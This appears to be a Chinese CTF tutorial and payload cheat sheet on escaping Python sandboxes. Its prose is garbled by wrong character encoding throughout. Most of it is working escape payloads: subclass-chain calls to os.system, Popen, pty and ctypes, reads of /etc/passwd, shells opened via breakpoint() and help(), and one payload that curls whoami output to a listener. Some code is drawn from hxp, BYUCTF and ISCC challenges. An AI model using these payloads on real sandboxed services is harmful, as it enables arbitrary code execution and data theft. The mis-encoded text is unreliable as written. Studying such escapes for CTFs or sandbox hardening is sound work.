## ç»•è¿‡å‘½åç©ºé—´é™åˆ¶

### éƒ¨åˆ†é™åˆ¶
æœ‰äº›æ²™ç®±åœ¨æ„å»ºæ—¶ä½¿ç”¨ exec æ¥æ‰§è¡Œå‘½ä»¤ï¼Œexec å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥æŒ‡å®šå‘½åç©ºé—´ï¼Œé€šè¿‡ä¿®æ”¹ã€åˆ é™¤å‘½åç©ºé—´ä¸­çš„å‡½æ•°åˆ™å¯ä»¥æ„å»ºä¸€ä¸ªæ²™ç®±ã€‚ä¾‹å­æ¥æºäº iscc_2016_pycalcã€‚

```py
def _hook_import_(name, *args, **kwargs):
    module_blacklist = ['os', 'sys', 'time', 'bdb', 'bsddb', 'cgi',
                        'CGIHTTPServer', 'cgitb', 'compileall', 'ctypes', 'dircache',
                        'doctest', 'dumbdbm', 'filecmp', 'fileinput', 'ftplib', 'gzip',
                        'getopt', 'getpass', 'gettext', 'httplib', 'importlib', 'imputil',
                        'linecache', 'macpath', 'mailbox', 'mailcap', 'mhlib', 'mimetools',
                        'mimetypes', 'modulefinder', 'multiprocessing', 'netrc', 'new',
                        'optparse', 'pdb', 'pipes', 'pkgutil', 'platform', 'popen2', 'poplib',
                        'posix', 'posixfile', 'profile', 'pstats', 'pty', 'py_compile',
                        'pyclbr', 'pydoc', 'rexec', 'runpy', 'shlex', 'shutil', 'SimpleHTTPServer',
                        'SimpleXMLRPCServer', 'site', 'smtpd', 'socket', 'SocketServer',
                        'subprocess', 'sysconfig', 'tabnanny', 'tarfile', 'telnetlib',
                        'tempfile', 'Tix', 'trace', 'turtle', 'urllib', 'urllib2',
                        'user', 'uu', 'webbrowser', 'whichdb', 'zipfile', 'zipimport']
    for forbid in module_blacklist:
        if name == forbid:        # don't let user import these modules
            raise RuntimeError('No you can\' import {0}!!!'.format(forbid))
    # normal modules can be imported
    return __import__(name, *args, **kwargs)

def sandbox_exec(command):      # sandbox user input
    result = 0
    __sandboxed_builtins__ = dict(__builtins__.__dict__)
    __sandboxed_builtins__['__import__'] = _hook_import_    # hook import
    del __sandboxed_builtins__['open']
    _global = {
        '__builtins__': __sandboxed_builtins__
    }

    ...
        exec command in _global     # do calculate in a sandboxed  
    ...
```
1. æ²™ç®±é¦–å…ˆè·å– `__builtins__`ï¼Œç„¶åä¾æ®ç°æœ‰çš„ `__builtins__` æ¥æ„å»ºå‘½åç©ºé—´ã€‚
2. ä¿®æ”¹ `__import__` å‡½æ•°ä¸ºè‡ªå®šä¹‰çš„`_hook_import_`
3. åˆ é™¤ open å‡½æ•°é˜²æ­¢æ–‡ä»¶æ“ä½œ
4. exec å‘½ä»¤ã€‚

ç»•è¿‡æ–¹å¼ï¼š

ç”±äº exec è¿è¡Œåœ¨ç‰¹å®šçš„å‘½åç©ºé—´é‡Œï¼Œå¯ä»¥é€šè¿‡è·å–å…¶ä»–å‘½åç©ºé—´é‡Œçš„ `__builtins__`ï¼ˆè¿™ä¸ª`__builtins__`ä¿å­˜çš„å°±æ˜¯åŸå§‹`__builtins__`çš„å¼•ç”¨ï¼‰ï¼Œæ¯”å¦‚ types åº“ï¼Œæ¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š
```py
__import__('types').__builtins__
__import__('string').__builtins__
```
### å®Œå…¨é™åˆ¶(no builtins)
å¦‚æœæ²™ç®±å®Œå…¨æ¸…ç©ºäº† `__builtins__`, åˆ™æ— æ³•ä½¿ç”¨ import,å¦‚ä¸‹ï¼š
```py
>>> eval("__import__", {"__builtins__": {}},{"__builtins__": {}})
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
NameError: name '__import__' is not defined
>>> eval("__import__")
<built-in function __import__>

>>> exec("import os")
>>> exec("import os",{"__builtins__": {}},{"__builtins__": {}})
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
ImportError: __import__ not found
```

è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å°±éœ€è¦åˆ©ç”¨ python ç»§æ‰¿é“¾æ¥ç»•è¿‡ï¼Œå…¶æ­¥éª¤ç®€å•æ¥è¯´ï¼Œå°±æ˜¯é€šè¿‡ python ç»§æ‰¿é“¾è·å–å†…ç½®ç±», ç„¶åé€šè¿‡è¿™äº›å†…ç½®ç±»è·å–åˆ°æ•æ„Ÿæ–¹æ³•ä¾‹å¦‚ os.system ç„¶åå†è¿›è¡Œåˆ©ç”¨ã€‚

å…·ä½“åŸç†å¯è§ï¼š[Pythonæ²™ç®±é€ƒé€¸å°ç»“](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals)

å¸¸è§çš„ä¸€äº› payload å¦‚ä¸‹:
#### RCE
```py
# os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("ls")

# subprocess 
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen'][0]('ls')

# builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_GeneratorContextManagerBase" and "os" in x.__init__.__globals__ ][0]["__builtins__"]

# help
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_GeneratorContextManagerBase" and "os" in x.__init__.__globals__ ][0]["__builtins__"]['help']

[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]['__builtins__']

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")

[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")

#imp
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")

# ctypes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__('ctypes').CDLL(None).system('ls /'.encode())

# multiprocessing
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__('multiprocessing').Process(target=lambda: __import__('os').system('curl localhost:9999/?a=`whoami`')).start()
```
#### File

æ“ä½œæ–‡ä»¶å¯ä»¥ä½¿ç”¨ builtins ä¸­çš„ openï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ FileLoader æ¨¡å—çš„ get_data æ–¹æ³•ã€‚
```py
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__=="FileLoader" ][0].get_data(0,"/etc/passwd")
```

## ç»•è¿‡é•¿åº¦é™åˆ¶
BYUCTF_2023 ä¸­çš„å‡ é“ jail é¢˜å¯¹ payload çš„é•¿åº¦ä½œäº†é™åˆ¶
```py
eval((__import__("re").sub(r'[a-z0-9]','',input("code > ").lower()))[:130])
```

é¢˜ç›®é™åˆ¶ä¸èƒ½å‡ºç°æ•°å­—å­—æ¯ï¼Œæ„é€ çš„ç›®æ ‡æ˜¯è°ƒç”¨ open å‡½æ•°è¿›è¡Œè¯»å–

```py
print(open(bytes([102,108,97,103,46,116,120,116])).read())
```
å‡½æ•°åæ¯”è¾ƒå¥½ç»•è¿‡ï¼Œç›´æ¥ä½¿ç”¨ unicodeã€‚æ•°å­—ä¹Ÿå¯ä»¥ä½¿ç”¨ ord æ¥è·å–ç„¶åè¿›è¡Œç›¸å‡ã€‚æˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯ chr(333).
```py
# f = 102 = 333-231 = ord('Å')-ord('Ã§')
# a = 108 = 333-225 = ord('Å')-ord('Ã¡')
# l = 97 = 333-236 = ord('Å')-ord('Ã¬')
# g = 103 = 333-230 = ord('Å')-ord('Ã¦')
# . = 46 = 333-287 = ord('Å')-ord('ÄŸ')
# t = 116 = 333-217 = ord('Å')-ord('Ã™')
# x = 120 = = 333-213 = ord('Å')-ord('Ã•')

print(open(bytes([ord('Å')-ord('Ã§'),ord('Å')-ord('Ã¡'),ord('Å')-ord('Ã¬'),ord('Å')-ord('Ã¦'),ord('Å')-ord('ÄŸ'),ord('Å')-ord('Ã™'),ord('Å')-ord('Ã•'),ord('Å')-ord('Ã™')])).read())
```
ä½†è¿™æ ·çš„è¯å…¶å®é•¿åº¦è¶…å‡ºäº†é™åˆ¶ã€‚è€Œé¢˜ç›®çš„ eval è¡¨ç¤ºä¸æ”¯æŒåˆ†å· ;ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æ·»åŠ ä¸€ä¸ª execã€‚ç„¶åå°† ord ä»¥åŠä¸å˜çš„ `a('Å')` è¿›è¡Œæ›¿æ¢ã€‚è¿™æ ·å°±å¯ä»¥æ„é€ ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„ payload
```py
exec("a=ord;b=a('Å');print(open(bytes([b-a('Ã§'),b-a('Ã¡'),b-a('Ã¬'),b-a('Ã¦'),b-a('ÄŸ'),b-a('Ã™'),b-a('Ã•'),b-a('Ã™')])).read())")
```
ä½†å…¶å®å°è¯•ä¹‹åå‘ç°è¿™ä¸ª payload ä¼šæŠ¥é”™ï¼ŒåŸå› åœ¨äºå…¶ä¸­çš„æŸäº› unicode å­—ç¬¦é‡åˆ° lower() æ—¶ä¼šå‘ç”Ÿå˜åŒ–ï¼Œé¿å… lower äº§ç”Ÿå¹²æ‰°ï¼Œå¯ä»¥åœ¨é€‰å– unicode æ—¶é€‰æ‹© ord å€¼æ›´å¤§çš„å­—ç¬¦ã€‚ä¾‹å¦‚ chr(4434)

å½“ç„¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ input å‡½æ•°æ¥ç»•è¿‡é•¿åº¦é™åˆ¶ã€‚

### æ‰“å¼€ input è¾“å…¥
å¦‚æœæ²™ç®±å†…æ‰§è¡Œçš„å†…å®¹æ˜¯é€šè¿‡ input è¿›è¡Œä¼ å…¥çš„è¯ï¼ˆä¸æ˜¯ web ä¼ å‚ï¼‰ï¼Œæˆ‘ä»¬å…¶å®å¯ä»¥ä¼ å…¥ä¸€ä¸ª input æ‰“å¼€ä¸€ä¸ªæ–°çš„è¾“å…¥æµï¼Œç„¶åå†è¾“å…¥æœ€ç»ˆçš„ payloadï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡æ‰€æœ‰çš„é˜²æŠ¤ã€‚

ä»¥ BYUCTF2023 jail a-z0-9 ä¸ºä¾‹ï¼š
```py
eval((__import__("re").sub(r'[a-z0-9]','',input("code > ").lower()))[:130])
```
å³ä½¿é™åˆ¶äº†å­—æ¯æ•°å­—ä»¥åŠé•¿åº¦ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä¼ å…¥ä¸‹é¢çš„ payloadï¼ˆæ³¨æ„æ˜¯ unicodeï¼‰
```py
ğ˜¦ğ˜·ğ˜¢ğ˜­(ğ˜ªğ˜¯ğ˜±ğ˜¶ğ˜µ())
```
è¿™æ®µ payload æ‰“å¼€ input è¾“å…¥åï¼Œæˆ‘ä»¬å†è¾“å…¥æœ€ç»ˆçš„ payload å°±å¯ä»¥æ­£å¸¸æ‰§è¡Œã€‚
```py
__import__('os').system('whoami')
```

æ‰“å¼€è¾“å…¥æµéœ€è¦ä¾èµ– input å‡½æ•°ï¼Œno builtins çš„ç¯å¢ƒä¸­æˆ–è€…é¢˜ç›®éœ€è¦ä»¥ http è¯·æ±‚çš„æ–¹å¼è¿›è¡Œè¾“å…¥æ—¶ï¼Œè¿™ç§æ–¹æ³•å°±æ— æ³•ä½¿ç”¨äº†ã€‚

ä¸‹é¢æ˜¯ä¸€äº›æ‰“å¼€è¾“å…¥æµçš„æ–¹å¼:
#### sys.stdin.read()
æ³¨æ„è¾“å…¥å®Œæ¯•ä¹‹åæŒ‰ ctrl+d ç»“æŸè¾“å…¥
```py
>>> eval(sys.stdin.read())
__import__('os').system('whoami')
kali
0
>>>
```
#### sys.stdin.readline()
```py
>>> eval(sys.stdin.readline())
__import__('os').system('whoami')
```


#### sys.stdin.readlines()
```py
>>> eval(sys.stdin.readlines()[0])
__import__('os').system('whoami')
```

åœ¨ python2 ä¸­ï¼Œåœ¨python 2ä¸­ï¼Œinput å‡½æ•°ä»æ ‡å‡†è¾“å…¥æ¥æ”¶è¾“å…¥ä¹‹åä¼šè‡ªåŠ¨ eval æ±‚å€¼ã€‚å› æ­¤æ— éœ€åœ¨å‰é¢åŠ ä¸Š evalã€‚ä½† raw_input ä¸ä¼šè‡ªåŠ¨ evalã€‚

### breakpoint å‡½æ•°
pdb æ¨¡å—å®šä¹‰äº†ä¸€ä¸ªäº¤äº’å¼æºä»£ç è°ƒè¯•å™¨ï¼Œç”¨äº Python ç¨‹åºã€‚å®ƒæ”¯æŒåœ¨æºç è¡Œé—´è®¾ç½®ï¼ˆæœ‰æ¡ä»¶çš„ï¼‰æ–­ç‚¹å’Œå•æ­¥æ‰§è¡Œï¼Œæ£€è§†å †æ ˆå¸§ï¼Œåˆ—å‡ºæºç åˆ—è¡¨ï¼Œä»¥åŠåœ¨ä»»ä½•å †æ ˆå¸§çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œä»»æ„ Python ä»£ç ã€‚å®ƒè¿˜æ”¯æŒäº‹åè°ƒè¯•ï¼Œå¯ä»¥åœ¨ç¨‹åºæ§åˆ¶ä¸‹è°ƒç”¨ã€‚

åœ¨è¾“å…¥ breakpoint() åå¯ä»¥ä»£å¼€ Pdb ä»£ç è°ƒè¯•å™¨ï¼Œåœ¨å…¶ä¸­å°±å¯ä»¥æ‰§è¡Œä»»æ„ python ä»£ç 
```py
>>> ğ˜£ğ˜³ğ˜¦ğ˜¢ğ˜¬ğ˜±ğ˜°ğ˜ªğ˜¯ğ˜µ()
--Return--
> <stdin>(1)<module>()->None
(Pdb) __import__('os').system('ls')
a-z0-9.py  exp2.py  exp.py  flag.txt
0
(Pdb) __import__('os').system('sh')
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt
```

### help å‡½æ•°
help å‡½æ•°å¯ä»¥æ‰“å¼€å¸®åŠ©æ–‡æ¡£. ç´¢å¼•åˆ° os æ¨¡å—ä¹‹åå¯ä»¥æ‰“å¼€ sh

å½“æˆ‘ä»¬è¾“å…¥ help æ—¶ï¼Œæ³¨æ„è¦è¿›è¡Œ unicode ç¼–ç ï¼Œhelp å‡½æ•°ä¼šæ‰“å¼€å¸®åŠ©
```py
ğ˜©ğ˜¦ğ˜­ğ˜±()
```
ç„¶åè¾“å…¥ os,æ­¤æ—¶ä¼šè¿›å…¥ os çš„å¸®åŠ©æ–‡æ¡£ã€‚
```py
help> os
```
ç„¶ååœ¨è¾“å…¥ `!sh` å°±å¯ä»¥æ‹¿åˆ° /bin/sh, è¾“å…¥ `!bash` åˆ™å¯ä»¥æ‹¿åˆ° /bin/bash
```py
help> os
$ ls
a-z0-9.py  exp2.py  exp.py  flag.txt
$ 
```

## ç»•è¿‡å¤šè¡Œé™åˆ¶
ç»•è¿‡å¤šè¡Œé™åˆ¶çš„åˆ©ç”¨æ‰‹æ³•é€šå¸¸åœ¨é™åˆ¶äº†å•è¡Œä»£ç çš„æƒ…å†µä¸‹ä½¿ç”¨,ä¾‹å¦‚ eval, ä¸­é—´å¦‚æœå­˜åœ¨ï¼›æˆ–è€…æ¢è¡Œä¼šæŠ¥é”™ã€‚
```python
>>> eval("__import__('os');print(1)")
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1
    __import__('os');print(1)
```
### exec
exec å¯ä»¥æ”¯æŒæ¢è¡Œç¬¦ä¸`;`
```python
>>> eval("exec('__import__(\"os\")\\nprint(1)')")
1
```

### compile
compile åœ¨ single æ¨¡å¼ä¸‹ä¹ŸåŒæ ·å¯ä»¥ä½¿ç”¨ \n è¿›è¡Œæ¢è¡Œ, åœ¨ exec æ¨¡å¼ä¸‹å¯ä»¥ç›´æ¥æ‰§è¡Œå¤šè¡Œä»£ç . 
```python
eval('''eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec'))''')
```
### æµ·è±¡è¡¨è¾¾å¼
æµ·è±¡è¡¨è¾¾å¼æ˜¯ Python 3.8 å¼•å…¥çš„ä¸€ç§æ–°çš„è¯­æ³•ç‰¹æ€§ï¼Œç”¨äºåœ¨è¡¨è¾¾å¼ä¸­åŒæ—¶è¿›è¡Œèµ‹å€¼å’Œæ¯”è¾ƒæ“ä½œã€‚

æµ·è±¡è¡¨è¾¾å¼çš„è¯­æ³•å½¢å¼å¦‚ä¸‹ï¼š
```python
<expression> := <value> if <condition> else <value>
```
å€ŸåŠ©æµ·è±¡è¡¨è¾¾å¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ—è¡¨æ¥æ›¿ä»£å¤šè¡Œä»£ç ï¼š
```python
>>> eval('[a:=__import__("os"),b:=a.system("id")]')
uid=1000(kali) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer)
[<module 'os' (frozen)>, 0]
```


## å˜é‡è¦†ç›–ä¸å‡½æ•°ç¯¡æ”¹
åœ¨ Python ä¸­ï¼Œsys æ¨¡å—æä¾›äº†è®¸å¤šä¸ Python è§£é‡Šå™¨å’Œå…¶ç¯å¢ƒäº¤äº’çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬å¯¹å…¨å±€å˜é‡å’Œå‡½æ•°çš„æ“ä½œã€‚åœ¨æ²™ç®±ä¸­è·å– sys æ¨¡å—å°±å¯ä»¥è¾¾åˆ°å˜é‡è¦†ç›–ä¸å‡½æ•°æ“¦ç¯¡æ”¹çš„ç›®çš„.

sys.modules å­˜æ”¾äº†ç°æœ‰æ¨¡å—çš„å¼•ç”¨, é€šè¿‡è®¿é—® `sys.modules['__main__']` å°±å¯ä»¥è®¿é—®å½“å½“å‰æ¨¡å—å®šä¹‰çš„æ‰€æœ‰å‡½æ•°ä»¥åŠå…¨å±€å˜é‡

```py
>>> aaa = 'bbb'
>>> def my_input():
...     dict_global = dict()
...     while True:
...       try:
...           input_data = input("> ")
...       except EOFError:
...           print()
...           break
...       except KeyboardInterrupt:
...           print('bye~~')
...           continue
...       if input_data == '':
...           continue
...       try:
...           complie_code = compile(input_data, '<string>', 'single')
...       except SyntaxError as err:
...           print(err)
...           continue
...       try:
...           exec(complie_code, dict_global)
...       except Exception as err:
...           print(err)
... 
>>> import sys
>>> sys.modules['__main__']
<module '__main__' (built-in)>
>>> dir(sys.modules['__main__'])
['__annotations__', '__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', 'aaa', 'my_input', 'sys']
>>> sys.modules['__main__'].aaa
'bbb'
```

é™¤äº†é€šè¿‡ sys æ¨¡å—æ¥è·å–å½“å‰æ¨¡å—çš„å˜é‡ä»¥åŠå‡½æ•°å¤–,è¿˜å¯ä»¥é€šè¿‡ `__builtins__`ç¯¡æ”¹å†…ç½®å‡½æ•°ç­‰,è¿™åªæ˜¯ä¸€ä¸ªæ€è·¯.

æ€»ä½“æ¥è¯´,åªè¦è·å–äº†æŸä¸ªå‡½æ•°æˆ–è€…å˜é‡å°±å¯ä»¥ç¯¡æ”¹, éš¾ç‚¹å°±åœ¨äºè·å–.

### åˆ©ç”¨ gc è·å–å·²åˆ é™¤æ¨¡å—
è¿™ä¸ªæ€è·¯æ¥æºäº [writeup by fab1ano â€“ github](https://github.com/fab1ano/hxp-ctf-20/tree/master/audited)

è¿™é“é¢˜çš„ç›®æ ‡æ˜¯è¦†ç›– `__main__` ä¸­çš„ `__exit` å‡½æ•°,ä½†æ˜¯é¢˜ç›®å°† `sys.modules['__main__']` åˆ é™¤äº†,æ— æ³•ç›´æ¥è·å–.
```py
for module in set(sys.modules.keys()):
    if module in sys.modules:
        del sys.modules[module]
```

`gc` æ˜¯Pythonçš„å†…ç½®æ¨¡å—ï¼Œå…¨åä¸º"garbage collector"ï¼Œä¸­æ–‡è¯‘ä¸º"åƒåœ¾å›æ”¶"ã€‚`gc` æ¨¡å—ä¸»è¦çš„åŠŸèƒ½æ˜¯æä¾›ä¸€ä¸ªæ¥å£ä¾›å¼€å‘è€…ç›´æ¥ä¸ Python çš„åƒåœ¾å›æ”¶æœºåˆ¶è¿›è¡Œäº¤äº’ã€‚

Python ä½¿ç”¨äº†å¼•ç”¨è®¡æ•°ä½œä¸ºå…¶ä¸»è¦çš„å†…å­˜ç®¡ç†æœºåˆ¶ï¼ŒåŒæ—¶ä¹Ÿå¼•å…¥äº†å¾ªç¯åƒåœ¾å›æ”¶å™¨æ¥æ£€æµ‹å¹¶æ”¶é›†å¾ªç¯å¼•ç”¨çš„å¯¹è±¡ã€‚`gc` æ¨¡å—æä¾›äº†ä¸€äº›å‡½æ•°ï¼Œè®©ä½ å¯ä»¥ç›´æ¥æ§åˆ¶è¿™ä¸ªå¾ªç¯åƒåœ¾å›æ”¶å™¨ã€‚

ä¸‹é¢æ˜¯ä¸€äº› `gc` æ¨¡å—ä¸­çš„ä¸»è¦å‡½æ•°ï¼š
1. `gc.collect(generation=2)`ï¼šè¿™ä¸ªå‡½æ•°ä¼šç«‹å³è§¦å‘ä¸€æ¬¡åƒåœ¾å›æ”¶ã€‚ä½ å¯ä»¥é€šè¿‡ `generation` å‚æ•°æŒ‡å®šè¦æ”¶é›†çš„ä»£æ•°ã€‚Python çš„åƒåœ¾å›æ”¶å™¨æ˜¯åˆ†ä»£çš„ï¼Œæ–°åˆ›å»ºçš„å¯¹è±¡åœ¨ç¬¬ä¸€ä»£ï¼Œç»å†è¿‡ä¸€æ¬¡åƒåœ¾å›æ”¶åä»ç„¶å­˜æ´»çš„å¯¹è±¡ä¼šè¢«ç§»åˆ°ä¸‹ä¸€ä»£ã€‚
2. `gc.get_objects()`ï¼šè¿™ä¸ªå‡½æ•°ä¼šè¿”å›å½“å‰è¢«ç®¡ç†çš„æ‰€æœ‰å¯¹è±¡çš„åˆ—è¡¨ã€‚
3. `gc.get_referrers(*objs)`ï¼šè¿™ä¸ªå‡½æ•°ä¼šè¿”å›æŒ‡å‘ `objs` ä¸­ä»»ä½•ä¸€ä¸ªå¯¹è±¡çš„å¯¹è±¡åˆ—è¡¨ã€‚


exp å¦‚ä¸‹
```py
for obj in gc.get_objects():
    if '__name__' in dir(obj):
        if '__main__' in obj.__name__:
            print('Found module __main__')
            mod_main = obj
        if 'os' == obj.__name__:
            print('Found module os')
            mod_os = obj
mod_main.__exit = lambda x : print("[+] bypass")
```
åœ¨ 3.11 ç‰ˆæœ¬å’Œ python 3.8.10 ç‰ˆæœ¬ä¸­æµ‹è¯•å‘ç°ä¼šè§¦å‘ gc.get_objects hook å¯¼è‡´æ— æ³•æˆåŠŸ. 

### åˆ©ç”¨ traceback è·å–æ¨¡å—
è¿™ä¸ªæ€è·¯æ¥æºäº [writeup by hstocks â€“ github](https://github.com/hstocks/ctf_writeups/blob/master/2020/hxp/audited/README.md)

ä¸»åŠ¨æŠ›å‡ºå¼‚å¸¸, å¹¶è·å–å…¶åè¦æ‰§è¡Œçš„ä»£ç , ç„¶åå°†`__exit` è¿›è¡Œæ›¿æ¢, æ€è·¯ä¹Ÿæ˜¯ååˆ†å·§å¦™.

```py
try:
    raise Exception()
except Exception as e:
    _, _, tb = sys.exc_info()
    nxt_frame = tb.tb_frame

    # Walk up stack frames until we find one which
    # has a reference to the audit function
    while nxt_frame:
        if 'audit' in nxt_frame.f_globals:
            break
        nxt_frame = nxt_frame.f_back

    # Neuter the __exit function
    nxt_frame.f_globals['__exit'] = print

    # Now we're free to call whatever we want
    os.system('cat /flag*')
```
ä½†æ˜¯å®é™…æµ‹è¯•æ—¶ä½¿ç”¨ python 3.11 å‘ç° `nxt_frame = tb.tb_frame` ä¼šè§¦å‘ `object.__getattr__` hook. ä¸åŒçš„ç‰ˆæœ¬ä¸­è§¦å‘ hook çš„åœ°æ–¹ä¼šæœ‰å·®å¼‚,è¿™ä¸ª payload å¯èƒ½ä»…åœ¨ python 3.9 (é¢˜ç›®ç‰ˆæœ¬)ä¸­é€‚ç”¨

## ç»•è¿‡ audit hook
Python çš„å®¡è®¡äº‹ä»¶åŒ…æ‹¬ä¸€ç³»åˆ—å¯èƒ½å½±å“åˆ° Python ç¨‹åºè¿è¡Œå®‰å…¨æ€§çš„é‡è¦æ“ä½œã€‚è¿™äº›äº‹ä»¶çš„ç§ç±»åŠåç§°ä¸åŒç‰ˆæœ¬çš„ Python è§£é‡Šå™¨æœ‰æ‰€ä¸åŒï¼Œä¸”å¯èƒ½ä¼šéšç€ Python è§£é‡Šå™¨çš„æ›´æ–°è€Œå˜åŠ¨ã€‚

Python ä¸­çš„å®¡è®¡äº‹ä»¶åŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸‹å‡ ç±»ï¼š

- `import`ï¼šå‘ç”Ÿåœ¨å¯¼å…¥æ¨¡å—æ—¶ã€‚
- `open`ï¼šå‘ç”Ÿåœ¨æ‰“å¼€æ–‡ä»¶æ—¶ã€‚
- `write`ï¼šå‘ç”Ÿåœ¨å†™å…¥æ–‡ä»¶æ—¶ã€‚
- `exec`ï¼šå‘ç”Ÿåœ¨æ‰§è¡ŒPythonä»£ç æ—¶ã€‚
- `compile`ï¼šå‘ç”Ÿåœ¨ç¼–è¯‘Pythonä»£ç æ—¶ã€‚
- `socket`ï¼šå‘ç”Ÿåœ¨åˆ›å»ºæˆ–ä½¿ç”¨ç½‘ç»œå¥—æ¥å­—æ—¶ã€‚
- `os.system`ï¼Œ`os.popen`ç­‰ï¼šå‘ç”Ÿåœ¨æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤æ—¶ã€‚
- `subprocess.Popen`ï¼Œ`subprocess.run`ç­‰ï¼šå‘ç”Ÿåœ¨å¯åŠ¨å­è¿›ç¨‹æ—¶ã€‚

[PEP 578 â€“ Python Runtime Audit Hooks](https://peps.python.org/pep-0578/)


calc_jail_beginner_level6 è¿™é“é¢˜ä¸­ä½¿ç”¨äº† audithook æ„å»ºæ²™ç®±,é‡‡ç”¨ç™½åå•æ¥è¿›è¡Œé™åˆ¶.audit hook å±äº python åº•å±‚çš„å®ç°,å› æ­¤å¸¸è§„çš„å˜æ¢æ ¹æœ¬æ— æ³•ç»•è¿‡.

é¢˜ç›®æºç å¦‚ä¸‹:
```py
import sys

def my_audit_hook(my_event, _):
    WHITED_EVENTS = set({'builtins.input', 'builtins.input/result', 'exec', 'compile'})
    if my_event not in WHITED_EVENTS:
        raise RuntimeError('Operation not permitted: {}'.format(my_event))

def my_input():
    dict_global = dict()
    while True:
      try:
          input_data = input("> ")
      except EOFError:
          print()
          break
      except KeyboardInterrupt:
          print('bye~~')
          continue
      if input_data == '':
          continue
      try:
          complie_code = compile(input_data, '<string>', 'single')
      except SyntaxError as err:
          print(err)
          continue
      try:
          exec(complie_code, dict_global)
      except Exception as err:
          print(err)


def main():
  WELCOME = '''
  _                _                           _       _ _   _                _   __
 | |              (_)                         (_)     (_) | | |              | | / /
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ | '_ \
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/
              __/ |                          _/ |
             |___/                          |__/                                                                        
  '''

  CODE = '''
  dict_global = dict()
    while True:
      try:
          input_data = input("> ")
      except EOFError:
          print()
          break
      except KeyboardInterrupt:
          print('bye~~')
          continue
      if input_data == '':
          continue
      try:
          complie_code = compile(input_data, '<string>', 'single')
      except SyntaxError as err:
          print(err)
          continue
      try:
          exec(complie_code, dict_global)
      except Exception as err:
          print(err)
  '''

  print(WELCOME)

  print("Welcome to the python jail")
  print("Let's have an beginner jail of calc")
  print("Enter your expression and I will evaluate it for you.")
  print("White list of audit hook ===> builtins.input,builtins.input/result,exec,compile")
  print("Some code of python jail:")
  print(CODE)
  my_input()

if __name__ == "__main__":
  sys.addaudithook(my_audit_hook)
  main()
```
